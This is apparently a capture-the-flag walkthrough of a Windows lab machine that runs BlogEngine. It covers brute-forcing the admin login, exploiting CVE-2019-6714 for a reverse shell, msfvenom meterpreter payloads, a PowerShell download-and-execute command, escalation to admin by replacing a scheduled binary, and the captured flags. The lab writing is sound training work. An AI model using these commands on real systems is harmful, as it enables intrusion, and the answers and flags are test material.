## 1) What's the name of the clown displayed on the homepage?

```
pennywise
```

  
<a name="2">
  
## 2) What request type is the Windows website login form using?

```
POST
```

  
  
<a name="3">
  

## 3) Guess a username, choose a passwordlist and gain credentials to a user account!

From the hints we can see that username is admin, and we will be using the infamous rockyou.txt as the password list.

Using BurpSuite to intercept we can see the post form and the body of the post form.

```
login: admin
password: 1qaz2wsx
```

## 4) Now you have logged into the website, are you able to identify the version of the BlogEngine?
  Scrolling down to the About tab on the left we can identify the version.

```
3.3.6.0
```

<a name="5">
  
  
## 5) What is the CVE?

Now we have to gain access to the machine using a reverse shell, but we can look for a vulnerability on www.exploit-db.com and searching "BlogEngine"

We found what we're looking for.

```
CVE-2019-6714
```

## 6) Using the public exploit, gain initial access to the server. Who is the webserver running as?
  
  
  
  
Go to Content -> Posts -> Welcome to HackPark
![image](https://user-images.githubusercontent.com/60508293/123197375-484eba00-d460-11eb-84bc-b5fe921e2358.png)
  
  
  
Upload PostView.ascx
  
  
Setup a nc listener on your chosen port.
```bash
nc -lvnp 4444
```

After, go to
```
http://{target_ip}/?theme=../../App_Data/files
```

```
iis apppool\blog
```
  
  
Time to pivot from netcat to meterpreter for a more full-fleshed shell.

## 7) Generating a reverse-shell payload using msfvenom (naming mine hello.exe)
  
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={your_ip} LPORT={your port} -f exe -o hello.exe
```

Setup a http server and download the payload.
```bash
python3 -m http.server
```
 
First, navigate to C:\Windows\Temp
  
  
Download the payload.
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/hello.exe','hello.exe')"
```
  
  
Setup metasploit
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LPORT {your port}
set LHOST {your ip}
run
```
Start Process
```
powershell "Start-Process 'hello.exe'"
```
  

We now have a meterpreter session!

## 8) What is the OS version of this windows machine?
  
  
![image](https://user-images.githubusercontent.com/60508293/123199476-c95b8080-d463-11eb-93ef-9fe073366576.png)
  
```
Windows 2012 R2 (6.3 Build 9600)
```

  
I'm going to be further enumerating the machine using [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). 

  
```metasploit
upload winPEAS.bat
shell
winPEAS.bat
```

## 9) What is the name of the abnormal service running?
I see something interesting
  
  
![image](https://user-images.githubusercontent.com/60508293/123202547-a207b200-d469-11eb-864b-5bebce900e15.png)
  
```
WindowsScheduler
```

## 10) What is the name of the binary you're supposed to exploit? 
  
Navigating to "C:\Program Files (x86)\SystemScheduler\events
  
Taking a look glance at all the .txt files I see something that sticks out:
![image](https://user-images.githubusercontent.com/60508293/123203405-273f9680-d46b-11eb-8436-2d44ac2e4604.png)
  
Message.exe seems to be running approximately every 30 seconds as admin.

```
Message.exe
```
  
Let's run our own payload abusing this fact.
  
Spawn a msfvenom payload called Message.exe
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={your_ip} LPORT={your_port} -f exe -o Message.exe
```
  
Setup another meterpreter session or a nc session.

Go to "C:\Program Files (x86)\SystemScheduler" and overwrite Message.exe

After a few seconds we should be connected:

I'm in metasploit so to search for text files
```
search -f *.txt
```

```bash
cat "c:\Users\jeff\Desktop\user.txt"
cat "c:\Users\Administrator\Desktop\root.txt"
```

**FLAG for Jeff** 759bd8af507517bcfaede78a21a73e39
  
  
**FLAG for Root** 7e13d97f05f7ceb9881a3eb3d78d3e72

## 11) What was the Original Install Time? 

Spawn a regular shell from meterpreter session then use the command systeminfo to find the time.
```
shell
systeminfo
```
